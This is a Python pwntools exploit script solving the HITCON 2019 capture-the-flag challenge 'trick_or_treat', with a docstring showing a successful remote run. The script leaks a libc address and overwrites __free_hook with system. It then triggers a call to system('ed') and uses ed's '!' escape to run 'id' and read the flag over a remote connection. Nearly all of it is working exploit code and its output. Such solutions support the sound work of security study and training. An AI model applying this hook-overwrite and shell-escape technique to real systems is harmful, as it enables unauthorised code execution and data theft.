from pwn import *
import time
import sys


def trick_or_treat(DEBUG):
	if DEBUG=="1":
		libc_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")
		r = process("./trick_or_treat") # debug with libc of system
		raw_input("debug?")
	elif DEBUG=="2":
		libc_file = ELF("./libc.so.6")
		r = process("./trick_or_treat",env={"LD_PRELOAD":"./libc.so.6"}) # debug with libc.so.6
		raw_input("debug?")
	elif DEBUG=="3":
		libc_file = ELF("./libc.so.6")
		HOST = '3.112.41.140'
		PORT = 56746
		r = remote(HOST,PORT) # remote expoit

	r.sendlineafter("Size:","100000000")
	r.recvuntil("Magic:")
	addr = int(r.recvuntil("\n").strip(),16)
	libc = addr + 0x5f5eff0
	__malloc_hook = libc +libc_file.symbols["__malloc_hook"]
	__free_hook = libc + libc_file.symbols["__free_hook"]
	one_gadget = libc + 0x10a38c # fail with remote environment
	puts = libc + libc_file.symbols["puts"] # to confirm __free_hook triggered
	system = libc + libc_file.symbols["system"]
	log.info("address: %#x", addr)
	log.info("libc: %#x", libc)
	log.info("__malloc_hook: %s" % hex(__malloc_hook))
	log.info("__free_hook: %s" % hex(__free_hook))
	log.info("puts: %s" % hex(puts))
	log.info("one_gadget: %s" % hex(one_gadget))
	
	r.recvuntil("Offset & Value:\x00")
	offset = (__free_hook - addr) // 8
	r.sendline(hex(offset) + " " +  hex(system)) # overwrite __free_hook with puts function address

	r.recvuntil("Offset & Value:\x00")
	payload = "2"*0x1000 # trigger malloc + free => __free_hook
	payload += " "
	payload += "ed" # system("ed")
	# https://www.gnu.org/software/ed/manual/ed_manual.html
	r.sendline(payload)
	
	r.sendline("! id")
	r.sendline("! cat home/trick_or_treat/flag")
	r.interactive()

trick_or_treat(sys.argv[1])
"""
$ python trick_or_treat.py 3
[*] '/home/phieulang/ctf/2019/HITCON/trick/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 3.112.41.140 on port 56746: Done
[*] address: 0x7f7057649010
[*] libc: 0x7f705d5a8000
[*] __malloc_hook: 0x7f705d993c30
[*] __free_hook: 0x7f705d9958e8
[*] puts: 0x7f705d6289c0
[*] one_gadget: 0x7f705d6b238c
[*] Switching to interactive mode
uid=1001(trick_or_treat) gid=1001(trick_or_treat) groups=1001(trick_or_treat)
!
hitcon{T1is_i5_th3_c4ndy_for_yoU}
!
$  
"""